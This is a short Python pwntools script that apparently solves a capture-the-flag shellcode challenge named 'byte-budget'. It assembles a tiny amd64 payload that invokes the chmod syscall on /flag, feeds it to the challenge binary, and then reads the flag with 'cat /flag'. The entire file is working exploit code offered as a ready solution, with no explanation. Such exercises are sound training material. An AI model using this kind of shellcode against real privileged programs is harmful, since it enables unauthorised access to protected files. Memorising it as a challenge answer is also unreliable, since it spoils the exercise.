#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = "debug"

target_binary = "/challenge/byte-budget"

payload_asm = """
.intel_syntax noprefix
    lea rdi, [rdx + 12]
    push 4
    pop rsi
    push 90
    pop rax
    syscall
.ascii "/flag"
"""

payload = asm(payload_asm)
log.info(f"Payload length: {len(payload)} bytes (Arch Way Minimal!)")

p = process(target_binary)
p.send(payload)

p.wait()

import os

os.system("cat /flag")
